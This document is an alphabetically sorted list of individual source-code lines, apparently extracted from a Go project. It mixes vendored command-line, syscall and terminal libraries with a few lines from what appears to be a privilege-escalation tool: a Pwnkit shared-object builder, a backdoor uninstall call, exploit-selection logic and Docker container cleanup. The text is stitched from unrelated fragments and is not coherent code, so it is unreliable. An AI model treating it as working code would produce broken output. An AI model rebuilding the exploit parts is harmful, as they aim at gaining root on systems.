historyPending string
http.Client
http.Client{
http.Transport{
http://pkg.go.dev/github.com/google/uuid
http://src.illumos.org/source/xref/illumos-gate/usr/src/lib/libc/port/gen/pt.c
http://www.gnu.org/software/libc/manual/html_node/Argument-Syntax.html
https://inconshreveable.com/09-09-2014/sweat-the-small-stuff/
hwidLC := strings.ToLower(hwid)
hwndParent               uintptr
i := 0
i := cpuBitsIndex(cpu)
i := len(buf) - 1
i = 16
i = countValue(
i = countValue(v)
i = int16Value(v)
i = int32Value(v)
i = int64Value(v)
i = int8Value(v)
i = intValue(v)
i = ipMaskValue(ip)
i = ipValue(ip)
i = j 
i = len(n)
i = len(s)
i = uint16Value(v)
i = uint32Value(v)
i = uint64Value(v)
i = uint8Value(v)
i = uintValue(v)
i)) }
i).String() }
iUZ2XgqLdAvB1zEx0Sv/VdOPHCJuejvdxLCJfHAkjBWkz6U7F1llREtQS0L9tURBbt48LrrAgMKyNoXjknIk3LRQ0Sdd2ncMZ4OMK1OjcLOlfaJnhVsXYhkIVF4n/pS0WC5qn8JqSlxUxgopH13
icCmd     int32
icDP      unsafe.Pointer
icDP:      unsafe.Pointer(
icLen     int32
icTimeout int32
id = int(r0)
id = uint32(r0)
id=26224719)
ident             uint32
ident             uint64
ident         uint32
ident       uint32
ident  uint32
idx := capidxbit(right)
if ! hash docker
if !allZero(segmentsOther[i:]) {
if !allZero(segmentsSelf[i:]) {
if !c.Check(v) {
if !c.HasSubCommands() {
if !c.IsAvailableCommand() 
if !c.Runnable() {
if !c.SilenceErrors {
if !cmd.HasParent() 
if !cmd.HasSubCommands() {
if !cmd.SilenceErrors 
if !cmd.SilenceUsage 
if !con.Equals(right[i]) {
if !disableFormatting {
if !entry.AllCommands {
if !exists {
if !f.interspersed {
if !finalCmd.DisableFlagParsing {
if !finalCmd.Root().TraverseChildren {
if !flag.Changed 
if !flag.Changed {
if !flag.Hidden {
if !flag.defaultIsZeroValue() {
if !flagWithEqual {
if !found {
if !includeDesc {
if !isPrintable(key) {
if !isRestricted 
if !isSet {
if !master {
if !nu.Valid {
if !ok 
if !ok {
if !p.handleTag(tagName) {
if !pasteActive 
if !pasteActive {
if !poolEnabled {
if !present {
if !raceenabled {
if !ret {
if !s.HasPassword {
if !s.IsDebianLike() {
if !s.IsPackageInstalled(name) {
if !s.changed {
if !sub.IsAdditionalHelpTopicCommand() {
if !t.echo {
if !t.pasteActive {
if !utf8.FullRune(b) {
if !v.isVulnerableDebian(s) 
if !w.Exited() {
if !w.Signaled() {
if !w.Stopped() {
if (entry.BinaryName == binary 
if (events 
if (maj < 6 
if (maj == 5 
if (r >= 'a' 
if (req != TCSETS) 
if (revents 
if (rights.Rights[i] 
if 0 <= s 
if EZBNMIF4 == nil {
if EnableCommandSorting 
if EnablePrefixMatching 
if GetActiveHelpConfig(finalCmd) == activeHelpGlobalDisable {
if MousetrapDisplayDuration > 0 {
if SizeofPtr == 8 
if SizeofPtr == 8 {
if [[ $key == FACILITY_
if [[ $last_vtype == Handle 
if [[ $line =
if [[ -v vtype ]]
if __FreeBSD__ >= 10
if a == s {
if absoluteSDSize > 0 {
if activeHelpCfg != activeHelpGlobalDisable {
if addr == 0 {
if addr%SizeofPtr != 0 {
if aggro {
if alertable {
if alreadyThere {
if argv == nil {
if asynchronous {
if atomic.LoadPointer((
if attr < 0 {
if attrs == INVALID_FILE_ATTRIBUTES {
if b == '
if b == a {
if b == nil 
if b2s(buffer.fsinfo[i].Mountpoint[:]) == name {
if bInheritHandle {
if b[0] != keyEscape {
if b[8] != '-' 
if base>>32 != 0 {
if basep == nil 
if binary.BigEndian.Uint32(pp[2:6]) != px_proto_oe {
if bufSize == 0 {
if buf[0] != '/' {
if buf[i] == ' ' {
if buf[len(buf)-1] == 0 {
if c == '/' {
if c == ':' 
if c == 0 {
if c == nil {
if c >= 'a' 
if c.Args == nil {
if c.CompletionOptions.DisableDefaultCmd 
if c.DisableFlagParsing {
if c.DisableFlagsInUseLine {
if c.DisableSuggestions {
if c.HasAvailableFlags() 
if c.HasParent() 
if c.HasParent() {
if c.HasPersistentFlags() {
if c.PostRunE != nil {
if c.PreRunE != nil {
if c.Root().TraverseChildren {
if c.RunE != nil {
if c.Runnable() 
if c.Stderr == nil {
if c.Stdin == nil {
if c.Stdout == nil {
if c.SuggestionsMinimumDistance <= 0 {
if c.TraverseChildren {
if c.args == nil 
if c.commandCalledAs.called {
if c.ctx == nil {
if c.errWriter != nil {
if c.flagErrorBuf == nil {
if c.flagErrorBuf.Len()-beforeErrorBufLen > 0 
if c.flagErrorFunc != nil {
if c.flags == nil {
if c.globNormFunc != nil {
if c.helpCommand == nil {
if c.helpFunc != nil {
if c.iflags == nil {
if c.iflags.Lookup(f.Name) == nil 
if c.inReader != nil {
if c.lflags == nil {
if c.lflags.Lookup(f.Name) == nil 
if c.outWriter != nil {
if c.parent == nil 
if c.parentsPflags == nil {
if c.pflags == nil {
if c.segments[cs-1] > v.segments[cs-1] {
if c.usageFunc != nil {
if canDoSearchSystem32() {
if capidxbit(rights.Rights[i]) != capidxbit(right) {
if caprver(right) != CAP_RIGHTS_VERSION_00 {
if capver(rights) != CAP_RIGHTS_VERSION_00 {
if cert == nil {
if certchain == nil {
if chars <= 1 {
if clockSeq == 0 {
if clockid == CLOCK_REALTIME 
if cmd != nil {
if cmd == nil 
if cmd == nil {
if cmd.DisableFlagParsing {
if cmd.IsAvailableCommand() {
if cmd.Name() == compCmdName 
if cmd.Name() == next 
if cmd.Root() == cmd {
if cmd.SysProcAttr == nil {
if cmd.ValidArgsFunction != nil {
if cmd.ctx == nil {
if cmdlineLen > 0 {
if cmds[i] == c {
if command == cmd {
if commandFound.Args == nil {
if commandPathLen > c.commandsMaxCommandPathLen {
if commandSection {
if compare != 0 {
if completeOk {
if completionFn != nil {
if conn.ident != nwmTCPConnIdentifier {
if connectExFunc.err != nil {
if constraints.Check(v1) {
if context == nil {
if control
if create {
if cs > len(v.segments) {
if cs[i].op < cs[j].op {
if cs[i].op > cs[j].op {
if d
if d == nil {
if d >= shellCompDirectiveMaxValue {
if d.dll != nil {
if d[i-1][j-1] < min {
if d[i][j-1] < min {
if daclDefaulted {
if daclPresent {
if daclSize > 0 {
if data.DriverDate.HighDateTime < driverDate.HighDateTime {
if data.DriverDate.HighDateTime > driverDate.HighDateTime {
if data.DriverDate.LowDateTime < driverDate.LowDateTime {
if data.DriverDate.LowDateTime > driverDate.LowDateTime {
if data.DriverVersion < driverVersion {
if data.DriverVersion > driverVersion {
if data.compatIDsLength > 0 {
if data.compatIDsOffset > 1 {
if defined(__powerpc__)
if defined(__sparc__)
if destsiz < 0 {
if didResize {
if disable {
if disableAllPrivileges {
if domain == AF_INET6 
if down == 1 {
if drivesBitMask == 0 {
if dstPos
if e != 0 {
if e != ERROR_INSUFFICIENT_BUFFER {
if e != nil 
if e != nil {
if e == ERROR_BROKEN_PIPE {
if e == nil {
if e1 != 0 {
if e1 == 0 
if entry.AllCommands {
if entryp == nil {
if envs == nil {
if err != 0 {
if err != ENOSYS {
if err != ERANGE {
if err != ERROR_INSUFFICIENT_BUFFER {
if err != nil 
if err != nil {
if err := (
if err := <-expChan
if err := Fchdir(dirfd)
if err := NewParser(output).Parse(strings.NewReader(input))
if err := backdoor.Uninstall(path)
if err := buildPwnkitSharedObjects()
if err := c.ParseFlags(flags)
if err := c.Start()
if err := c.ValidateArgs(argWoFlags)
if err := c.validateFlagGroups()
if err := c.validateRequiredFlags()
if err := cmd.Start()
if err := file.Close()
if err := grantpt(p)
if err := rootCmd.Execute()
if err := shellCmd.Run()
if err := tarWriter.WriteHeader(header)
if err := tempFile.Close()
if err := unlockpt(p)
if err := v.buildTarball(buffer)
if err := v.deleteContainer(container.ID)
if err := v.deleteImage(image)
if err := validateExclusiveFlagGroups(mutuallyExclusiveGroupStatus)
if err := validateRequiredFlagGroups(groupStatus)
if err := viper.ReadInConfig()
if err := w.Write(records)
if err = finalCmd.ParseFlags(finalArgs)
if err == ENOMEM {
if err == EOVERFLOW {
if err == ERANGE {
if err == ERROR_INSUFFICIENT_BUFFER {
if err == io.EOF 
if err == io.EOF {
if err == nil 
if err == nil {
if errno != 0 {
if errno != nil {
if errno := m.munmap(uintptr(unsafe.Pointer(
if errno == 0 {
if event == 0xffffffff {
if f == CommandLine {
if f == nil {
if f.Lookup(flag.Name) == nil {
if f.Lookup(goflag.Name) != nil {
if f.SortFlags {
if f.actual == nil {
if f.addedGoFlagSets != nil {
if f.addedGoFlagSets == nil {
if f.errorHandling != ContinueOnError {
if f.formal == nil {
if f.normalizeNameFunc != nil {
if f.output == nil {
if f.shorthands == nil {
if fName != flagName {
if fd != -1 {
if finalCmd.DisableFlagParsing {
if flag != nil 
if flag == nil 
if flag == nil {
if flag.Annotations == nil {
if flag.Hidden {
if flag.Value.Type() != ftype {
if flagErr != nil {
if flags
if flags 
if flags != 0 {
if flags == 0 {
if fmode
if fname == nname {
if forceAppsClosed {
if found {
if fsCount == 0 {
if ft == FILE_TYPE_PIPE {
if g == gid {
if groupDefaulted {
if groupSize > 0 {
if groupStatus[group] == nil {
if h == nil {
if h.Len < SizeofCmsghdr 
if handle != 0 {
if handle == 0 
if handle == 0 {
if handle == DevInfo(InvalidHandle) {
if handle == InvalidHandle {
if hasSpace {
if haveNoDescFlag {
if helpVal {
if i
if i != 16 {
if i != 4 {
if i < 0 
if i < j {
if i < len(errorList) 
if i < len(s) {
if i < len(signalList) 
if i < len(sysctlMib) 
if i < otherPreReleaseLen {
if i < selfPreReleaseLen {
if i == -1 {
if i == len(uname.Version)-1 {
if i == n {
if i > 0 {
if i > lenSelf-1 {
if i >= 0 {
if i >= n {
if i%16 == 0 {
if id == 0 {
if idx < 0 
if idx >= uint32(sid.SubAuthorityCount()) {
if ignoreCase {
if inTag {
if index < 0 {
if info.Mode()
if inheritExisting {
if inheritHandle {
if inheritHandles {
if initialOwner {
if ino == 0 { // File absent in directory.
if int(n) > len(b) {
if int32(r0) == -1 {
if int64(readSize) > v.pageSize {
if int64(ts.Sec) != sec {
if int64(writeSize) > v.pageSize {
if interfaces == nil {
if ip != nil {
if ip == nil {
if isBigEndian {
if isFlagArg(prevArg) {
if isSet {
if key == InvalidHandle {
if key == keyCtrlC {
if key == keyCtrlD {
if key == keyPasteStart {
if key == utf8.RuneError {
if l <= n {
if left == 1 {
if len == 0 {
if len > SizeofSockaddrAny {
if len(accessEntries) > 0 {
if len(account) == 0 {
if len(args) != 0 {
if len(args) != 2 {
if len(args) != n {
if len(args) < min 
if len(args) < n {
if len(args) <= 1 {
if len(args) == 0 {
if len(args) == 1 {
if len(args) > 0 {
if len(args) > 1 {
if len(args) > n {
if len(argsWOflags) == 0 {
if len(arguments) < 0 {
if len(auditEntries) > 0 {
if len(b) != int(size)
if len(b) < STATFIXLEN {
if len(b) < int(off
if len(b) == 0 {
if len(b) > 0 {
if len(backup) > 4095 {
if len(bracketedParts) == 2 {
if len(buf) > 0 {
if len(c.BashCompletionFunction) > 0 {
if len(c.Deprecated) != 0 
if len(c.Deprecated) > 0 {
if len(changes) > 0 {
if len(cl) > 0 {
if len(cmd.Aliases) == 0 {
if len(cmd.ValidArgs) > 0 {
if len(commandLine) == 0 {
if len(completions) == 0 {
if len(completions) == 1 
if len(cs) != len(c) {
if len(data) != 16 {
if len(data) == 0 
if len(data) == 0 {
if len(data) > 0 {
if len(dest) > 0 {
if len(dest) > idx {
if len(directives) == 0 {
if len(edir) > 0 {
if len(entry) == 0 {
if len(events) > 0 {
if len(explicitEntries) > 0 {
if len(f.actual) != len(f.sortedActual) {
if len(f.actual) == 0 {
if len(f.formal) != len(f.sortedFormal) {
if len(f.formal) == 0 {
if len(fds) == 0 {
if len(fds) > 0 {
if len(fields) < 2 {
if len(filter) > 0 {
if len(finalArgs) == 0 
if len(finalArgs) == 0 {
if len(finalCmd.ValidArgs) > 0 {
if len(first) > 0 
if len(flag.Deprecated) != 0 {
if len(flag.Name) == 1 {
if len(flag.NoOptDefVal) != 0 {
if len(flag.NoOptDefVal) == 0 {
if len(flag.Shorthand) > 0 
if len(flag.Shorthand) > 0 {
if len(flag.Shorthand) > 1 {
if len(flagName) == 0 {
if len(gids) == 0 {
if len(handles) > 0 {
if len(id) < 6 {
if len(ifs.HardwareAddr) >= 6 
if len(iovs) > 0 {
if len(kv) != 2 {
if len(l.received) > 0 {
if len(lastArg) > 0 
if len(line) > maxlen {
if len(localIov) > 0 {
if len(matches) == 1 {
if len(mib) != partno
if len(mib) > 0 {
if len(missingFlagNames) > 0 {
if len(moduleImage) > 0 {
if len(name) == 0 
if len(name) == 0 {
if len(name) == 1 {
if len(name) > 1 {
if len(name) >= IFNAMSIZ {
if len(name) >= len(l.Name) {
if len(o) == 0 {
if len(oob) > 0 
if len(oob) > 0 {
if len(p) != 2 {
if len(p) == 0 {
if len(p) > 0 {
if len(parts) == 1 {
if len(path) == 0 {
if len(payload) > 0 {
if len(processIds) > 0 {
if len(remoteIov) > 0 {
if len(rest) > 0 {
if len(ret) > 0 {
if len(rootCmd.Commands()) == 1 {
if len(s) != 8 {
if len(s) < min {
if len(s) == 0 
if len(s) == 0 {
if len(s) > 0 {
if len(sa.Dev) > IFNAMSIZ-1 {
if len(sa.Name) > 63 {
if len(sa.Remote) != 6 {
if len(sa.ServiceName) > len(sa.raw.Service_name) {
if len(sa.Type) > 13 {
if len(sa.UserID) > 8 
if len(segments) < 3 {
if len(set) == 0 
if len(shorthands) > 2 
if len(split) == 2 {
if len(split) >= 2 {
if len(src) != 16 {
if len(src) == 0 {
if len(subDir) == 1 {
if len(sval) == 0 {
if len(system) > 0 {
if len(t.line) == 0 {
if len(t.line) == cap(t.line) {
if len(t.line) == maxLineLength {
if len(ts) != 2 {
if len(tv) != 2 {
if len(unset) == len(flagnameAndStatus) 
if len(v) != 4 {
if len(v.args) > 0 {
if len(v.envs) > 0 {
if len(val) == 0 {
if len(validExts) != 0 {
if len(value) == 1 {
if len(value) > 0 {
if len(w.Msg) == 0 {
if lenSelf < lenOther {
if length <= 0 {
if length <= len(buffer) {
if lhs == rhs {
if lineIsPasted {
if lineOk {
if line[0] != '(' {
if localNonPersistentFlags.Lookup(flag.Name) != nil 
if localSockaddr.Addr.Family == AF_INET {
if localSockaddr.Addr[i] != 0 {
if localSockaddr.Port != 0 {
if logger.silenced {
if m > 0 {
if m > n {
if m.Header.Level != SOL_SOCKET {
if m.Header.Type != SCM_CREDENTIALS {
if m.Header.Type != SCM_RIGHTS {
if maj > 6 
if mask == nil {
if matches == nil {
if min == 0 {
if minor > 105 {
if mode
if mode == 0 {
if msg != nil {
if n != 0 {
if n != 4 {
if n != 8 {
if n != SizeofClockinfo {
if n != SizeofKinfoProc {
if n != SizeofUvmexp {
if n != unsafe.Sizeof(tv) {
if n < 0 
if n < 1 
if n < 1 {
if n < capArSizeMin 
if n <= uint32(len(b)) {
if n <= uint32(len(buf)) {
if n <= uint32(len(ret)) {
if n == -1 {
if n == 0 {
if n == len(s) {
if n == len(sa.raw.Path) 
if n > 0 
if n > 0 {
if n > len(b) {
if n > len(sa.raw.Path) {
if n >= len(sa.raw.Path) 
if n >= len(sa.raw.Path) {
if n%SizeofKinfoProc != 0 {
if nameLen > c.commandsMaxNameLen {
if name[0] != '/' {
if name[i] == '.' {
if needspace := 8 - len(fstype)
if newArgCount > realArgCount {
if newSet == nil {
if newlowoffset == 0xffffffff {
if newoffset == -1 {
if nf != len(f) {
if nfd == -1 {
if nlPos > 0 
if noDesc {
if noDescriptions {
if node.Name[i] != 0 {
if nodeID == zeroID {
if nonCompletableFlag(flag) {
if nonblocking {
if now <= lasttime {
if nsec < 0 {
if nu.Valid {
if nulli == -1 {
if numLanguages == 0 
if nwrite == 0 {
if off>>32 != 0 {
if offset != int64(page)
if offset%v.pageSize == 0 {
if ok == 0 {
if ok {
if oldSeq != clockSeq {
if on {
if openAsSelf {
if otherNumeric {
if ownerDefaulted {
if ownerSize > 0 {
if p == nil {
if p.IncludeLeadingResets 
if p.IncludeTrailingResets 
if p.PersistentPostRunE != nil {
if p.PersistentPreRunE != nil {
if p.proc == nil {
if pFd.Revents != 0 {
if pasteActive 
if payload != payloads.Defer {
if payload == payloads.Defer {
if perm
if persistentFlags.Lookup(f.Name) == nil {
if places > 0 
if poolPos == randPoolSize {
if pos == -1 {
if pp.Len != 0 
if pp.Len < 2 
if pp.Path[0] == 0 {
if pp.Path[i] == 0 {
if pp.Ss_sysaddr == AF_SYS_CONTROL {
if pp[i] == 0 {
if preExecHookFn != nil {
if preSelf == preOther {
if printToStdErr {
if proc == 0 {
if procEntry.ProcessID == uint32(pid) {
if processEntry.th32ProcessID == uint32(pid) {
if ptr == 0 {
if quit {
if r < 0 {
if r == '<' {
if r == '>' {
if r == nil {
if r0 != 0 {
if r0 == -1 
if r0 == 0 {
if r1
if r1 != 0 {
if r1 <= 32 {
if r1 == 0 {
if r1 == socket_error {
if raceenabled 
if raceenabled {
if raw.Family != AF_INET {
if rc == 0xffffffff {
if rebootAfterShutdown {
if recHeader.ident != nwmRecHeaderIdentifier {
if reclen > len(buf) {
if removeAfterwards {
if req != TCGETS {
if res == 0 {
if resData == 0 {
if resInfo == 0 {
if resetToDefault {
if resp.StatusCode != 201 {
if resp.StatusCode != http.StatusOK {
if resp.StatusCode == 200 {
if resp.StatusCode >= 400 {
if respStart.StatusCode != 204 {
if ret != nil {
if ret := cm_Get_Device_Interface_List_Size(
if ret == 0 {
if ret == 0xffffffff {
if ret == CR_SUCCESS {
if returnCode != 0 
if right == 1 {
if rl.Cur == rlimInf32 {
if rl.Max == rlimInf32 {
if rlim.Cur == rlimInf64 {
if rlim.Max == rlimInf64 {
if rsa.Addr.Family != AF_UNSPEC {
if runAnyExploit 
if s != 0 {
if s == -1 {
if s == nil {
if s.HasPassword {
if s.IsPackageInstalled(name) {
if s.bg == esc {
if s.entries == nil {
if s.fg == esc {
if s.size < s.max {
if s[1] == '-' {
if s[8] != '-' 
if s[i-1] == t[j-1] {
if sa.Addr == nil {
if sa.Ifindex < 0 
if sa.Index == 0 {
if sa.Port < 0 
if sa.raw.Path[0] == '@' {
if saclDefaulted {
if saclPresent {
if saclSize > 0 {
if sdLen < min {
if selfNumeric 
if selfNumeric {
if selfPreReleaseLen > otherPreReleaseLen {
if selfRelativeSDSize > 0 {
if sendRecvMsgFunc.err != nil {
if seq == -1 {
if short := flagSet.ShorthandLookup(name)
if short = set.ShorthandLookup(name)
if shouldSkip(exploit.Name) {
if sig == stopped 
if size <= 0 {
if size == 0 {
if skip == id {
if skip > 0 {
if snapshot == uintptr(syscall.InvalidHandle) {
if sockType != SOCK_DGRAM {
if speed == SpeedAny 
if spliced <= 0 {
if st.Mode
if stat.Fsid == uint64(mnt_ent_buffer.filesys_info[i].Dev) {
if stat.Mode()
if status != nil {
if store == 0 {
if str[i] == 0 {
if string(n) == part {
if strings.ToLower(a[i]) == hwidLC {
if strings.ToLower(data.HardwareID()) == hwidLC {
if sub.IsAdditionalHelpTopicCommand() {
if sub.IsAvailableCommand() {
if subCmd.IsAvailableCommand() 
if suggestByLevenshtein 
if suggestions := c.SuggestionsFor(arg)
if supportsABI(_ino64First) {
if system {
if sz != nil {
if t != nil {
if t.AutoCompleteCallback != nil {
if t.Kind() == reflect.Interface 
if t.cursorX == 0 
if t.cursorX >= t.termWidth {
if t.cursorY > t.maxLine {
if t.echo {
if t.historyIndex == -1 {
if t.line[pos] != ' ' {
if t.line[pos] == ' ' {
if t.pasteActive 
if t.pos < len(t.line) {
if t.pos < n {
if t.pos == 0 {
if t.pos == len(t.line) {
if tcpStats != nil {
if tcpStats == nil {
if tid == 0 {
if timeout != nil {
if timeout >= 0 {
if to != nil {
if todo > remainingOnLine {
if ts == nil {
if tv == nil {
if uid == 0 {
if uint32(gid) == st.Gid 
if uint32(uid) == st.Uid {
if uint64(pp.Service_name_len) > uint64(len(pp.Service_name)) {
if uint8(s.attrs)
if uintptr(addr.SockaddrLength) >= unsafe.Sizeof(RawSockaddrInet4{}) 
if uintptr(r0) == 
if unsafe.Sizeof(
if unsafe.Sizeof(uintptr(0)) == 4 {
if up == 1 {
if usageLen > c.commandsMaxUseLen {
if usage[i] == '
if usage[j] == '
if usec < 0 {
if v == 0 {
if v == nil 
if v == other {
if v > 15 {
if v.LessThan(c) {
if v.String() == other.String() {
if v.entry.AllCommands {
if v.segments[i] != c.segments[i] {
if v1.LessThan(v2) {
if val < 0 {
if value == 0 {
if value == nil {
if ver == 0 {
if versionVal {
if w
if w <= 0 {
if w == 0 {
if w.StopSignal() != SIGTRAP {
if wait {
if waitAll {
if waitResp.StatusCode != 200 {
if watchSubTree {
if watchSubtree {
if width == 0 {
if win32Error == noMatch {
if wpid == -1 {
if wrap < 24 {
if wstatus != nil {
if x < t.cursorX {
if x == y {
if x > t.cursorX {
if x.HasFlags() 
if x.HasFlags() {
if x.HasPersistentFlags() 
if x.HasPersistentFlags() {
if x.HasSubCommands() {
if x.flags.Lookup(f.Name) == nil {
if y < t.cursorY {
if y > t.cursorY {
if(A <= buf[0] 
if(i > 0 
if(p)
ifdef SOL_BLUETOOTH
iflags 
ifname = iname
ifname string  // name of interface being used
ifndef MSG_FASTOPEN
ifndef PTRACE_GETREGS
ifndef PTRACE_SETREGS
ifndef SOL_NETLINK
ifndef __LP64__
ifr.clear()
ifr.raw.Ifru[:2][0]))
ifr.raw.Ifru[:2][0])) = v
ifr.raw.Ifru[:4][0]))
ifr.raw.Ifru[:4][0])) = v
ifr.raw.Ifru[:SizeofSockaddrInet4][0]))
ifr.raw.Ifru[i] = 0
ifrd := ifr.withData(unsafe.Pointer(
ifrd)
ifreq directly.
ifreq)))
ifreqData) error {
illumos_amd64)
imageName := random.Image()
images)
implementation of Go constitutes direct or contributory patent
implementation of Go.  This grant does not include claims that would be
implementation.  If you or your agent or exclusive licensee institute or
import (
in a command-line interface. The methods of FlagSet are
in the documentation and/or other materials provided with the
inAfterClose      uint32
inAllAfterWin     uint32
inAllBeforeWin    uint32
inBadLen          uint32
inBadSum          uint32
inBuf     [256]byte
inBuffered        uint32
inBulkQSegs       uint64
inDiscOldTime     uint32
inDiscards        uint64
inDupAck          uint32
inEscapeSeq := false
inEscapeSeq = false
inEscapeSeq = true
inFlag := false
inFlag = false
inFlag = true
inOldestTime      [8]byte // uint64
inOutOfOrder      uint32
inReader io.Reader
inSegs            [8]byte  // uint64
inSegs            uint64
inShort           uint32
inSomeAfterWin    uint32
inSomeBeforeWin   uint32
inTag = false
inTag = true
inWinProbes       uint32
inWinUpdates      uint32
inactive:
include <asm-generic/termbits.h>
include <asm/termbits.h>
include <bits/sockaddr.h>
include <ctype.h>
include <dirent.h>
include <errno.h>
include <errno.h>' 
include <fcntl.h>
include <limits.h>
include <linux/bpf.h>
include <linux/can.h>
include <linux/can/error.h>
include <linux/can/netlink.h>
include <linux/can/raw.h>
include <linux/capability.h>
include <linux/cryptouser.h>
include <linux/devlink.h>
include <linux/dm-ioctl.h>
include <linux/errqueue.h>
include <linux/ethtool_netlink.h>
include <linux/falloc.h>
include <linux/fanotify.h>
include <linux/fib_rules.h>
include <linux/filter.h>
include <linux/fs.h>
include <linux/fscrypt.h>
include <linux/fsverity.h>
include <linux/genetlink.h>
include <linux/hdreg.h>
include <linux/hidraw.h>
include <linux/if.h>
include <linux/if_addr.h>
include <linux/if_alg.h>
include <linux/if_arp.h>
include <linux/if_ether.h>
include <linux/if_packet.h>
include <linux/if_ppp.h>
include <linux/if_tun.h>
include <linux/if_xdp.h>
include <linux/input.h>
include <linux/kcm.h>
include <linux/kexec.h>
include <linux/keyctl.h>
include <linux/landlock.h>
include <linux/loop.h>
include <linux/lwtunnel.h>
include <linux/magic.h>
include <linux/memfd.h>
include <linux/module.h>
include <linux/mount.h>
include <linux/net_namespace.h>
include <linux/netfilter/nfnetlink.h>
include <linux/netlink.h>
include <linux/nfc.h>
include <linux/nsfs.h>
include <linux/perf_event.h>
include <linux/pps.h>
include <linux/ptrace.h>
include <linux/random.h>
include <linux/reboot.h>
include <linux/rtc.h>
include <linux/rtnetlink.h>
include <linux/sched.h>
include <linux/seccomp.h>
include <linux/serial.h>
include <linux/sockios.h>
include <linux/taskstats.h>
include <linux/tipc.h>
include <linux/vm_sockets.h>
include <linux/wait.h>
include <linux/watchdog.h>
include <linux/wireguard.h>
include <mtd/mtd-user.h>
include <mtd/ubi-user.h>
include <net/bpf.h>
include <net/if.h>
include <net/if_arp.h>
include <net/if_bridge.h>
include <net/if_clone.h>
include <net/if_types.h>
include <net/if_var.h>
include <net/ip_mroute/ip_mroute.h>
include <net/netopt.h>
include <net/route.h>
include <netinet/icmp6.h>
include <netinet/if_ether.h>
include <netinet/in.h>
include <netinet/in_systm.h>
include <netinet/ip.h>
include <netinet/ip6.h>
include <netinet/ip_mroute.h>
include <netinet/tcp.h>
include <signal.h>
include <signal.h>' 
include <stddef.h>
include <stdint.h>
include <stdio.h>
include <stdlib.h>
include <string.h>
include <sys/attr.h>
include <sys/capsicum.h>
include <sys/clonefile.h>
include <sys/disk.h>
include <sys/epoll.h>
include <sys/event.h>
include <sys/eventfd.h>
include <sys/extattr.h>
include <sys/file.h>
include <sys/inotify.h>
include <sys/ioctl.h>
include <sys/kern_control.h>
include <sys/mkdev.h>
include <sys/mman.h>
include <sys/mount.h>
include <sys/param.h>
include <sys/poll.h>
include <sys/prctl.h>
include <sys/protosw.h>
include <sys/ptrace.h>
include <sys/resource.h>
include <sys/sched.h>
include <sys/select.h>
include <sys/signal.h>
include <sys/signalfd.h>
include <sys/socket.h>
include <sys/sockio.h>
include <sys/stat.h>
include <sys/stream.h>
include <sys/stropts.h>
include <sys/sys_domain.h>
include <sys/sysctl.h>
include <sys/termio.h>
include <sys/termios.h>
include <sys/time.h>
include <sys/timerfd.h>
include <sys/ttycom.h>
include <sys/types.h>
include <sys/uio.h>
include <sys/un.h>
include <sys/unistd.h>
include <sys/utsname.h>
include <sys/vsock.h>
include <sys/wait.h>
include <sys/xattr.h>
include <termios.h>
include <time.h>
include <unistd.h>
include and which symbols need to be 
includes='
includes_${uname}
includes_AIX='
includes_Darwin='
includes_DragonFly='
includes_FreeBSD='
includes_Linux='
includes_NetBSD='
includes_OpenBSD='
includes_SunOS='
index 
index := s.head - n
infFileName     [MAX_PATH]uint16
info
info := 
info)
info))
info.osVersionInfoSize = uint32(unsafe.Sizeof(
infringed only as a consequence of further modification of this
initializeSecurityDescriptor(absoluteSD 
inner    goflag.Value
innerfind = func(c 
input    io.Reader
inputDesc   nwmTriplet
inputs         []string
inside of the cmd/ directory.
install:
installPackage := fmt.Sprintf(
install_deps:
installation.
installing this package by using the GoDoc site here: 
int acct(uintptr_t)
int chdir(uintptr_t)
int chroot(uintptr_t)
int close(int)
int dup(int)
int errors[] = {
int fchdir(int)
int fdatasync(int)
int getegid()
int geteuid()
int getgid()
int getpgid(int)
int getpgrp()
int getpid()
int getppid()
int getsid(int)
int getuid()
int mlockall(int)
int munlockall()
int num
int pause()
int pipe(uintptr_t)
int setgid(int)
int setsid()
int settimeofday(uintptr_t)
int setuid(int)
int signals[] = {
int sync()
int time(uintptr_t)
int umask(int)
int umount(uintptr_t)
int uname(uintptr_t)
int unlink(uintptr_t)
int {
int(dstDirent.Namlen) : dstPos
int(srcDirent.Namlen)
int) 
int) (err error)
int) (err error) {
int) = SYS___ERR2AD
int) {
int)(unsafe.Pointer(
int)(unsafe.Pointer(ueadd))
int.
int16 {
int16) 
int16)(unsafe.Pointer(
int16Value {
int16Value) Set(s string) error {
int16Value) String() string { return strconv.FormatInt(int64(
int16Value) Type() string {
int16Value)(p)
int32 {
int32) 
int32) (argv 
int32) (err error) = advapi32.CheckTokenMembership
int32) (err error) [failretval==socket_error] = ws2_32.getpeername
int32) (err error) [failretval==socket_error] = ws2_32.getsockname
int32) (err error) [failretval==socket_error] = ws2_32.getsockopt
int32) (err error) {
int32) = mswsock.GetAcceptExSockaddrs
int32) {
int32)(h.data(4 
int32)(unsafe.Pointer(
int32SliceValue {
int32SliceValue) Append(val string) error {
int32SliceValue) GetSlice() []string {
int32SliceValue) Replace(val []string) error {
int32SliceValue) Set(val string) error {
int32SliceValue) String() string {
int32SliceValue) Type() string {
int32SliceValue) toString(val int32) string {
int32Value {
int32Value) Set(s string) error {
int32Value) String() string { return strconv.FormatInt(int64(
int32Value) Type() string {
int32Value)(p)
int64 {
int64) 
int64) (err error) {
int64) (ntstatus error) = ntdll.NtCreateNamedPipeFile
int64) (ntstatus error) {
int64)(unsafe.Pointer(
int64SliceValue {
int64SliceValue) Append(val string) error {
int64SliceValue) GetSlice() []string {
int64SliceValue) Replace(val []string) error {
int64SliceValue) Set(val string) error {
int64SliceValue) String() string {
int64SliceValue) Type() string {
int64SliceValue) toString(val int64) string {
int64Value {
int64Value) Set(s string) error {
int64Value) String() string { return strconv.FormatInt(int64(
int64Value) Type() string {
int64Value)(p)
int8
int8 {
int8) 
int8)(unsafe.Pointer(
int8Value {
int8Value) Set(s string) error {
int8Value) String() string { return strconv.FormatInt(int64(
int8Value) Type() string {
int8Value)(p)
intSliceValue {
intSliceValue) Append(val string) error {
intSliceValue) GetSlice() []string {
intSliceValue) Replace(val []string) error {
intSliceValue) Set(val string) error {
intSliceValue) String() string {
intSliceValue) Type() string {
intValue {
intValue) Set(s string) error {
intValue) String() string { return strconv.Itoa(int(
intValue) Type() string {
intValue)(p)
intcmp(const void 
interfaces similar to git 
interface{})(unsafe.Pointer(peInt.User))
interface{}]
interspersed      bool      // allow interspersed option/non-option args
interval)
intfName          [16]byte
into a common file for each OS.
intuitively know how to interact with them.
ioSync))
ioctl_TIOCGRANTPT = 0x20007447
ioctl_TIOCPTSNAME = 0x48087448
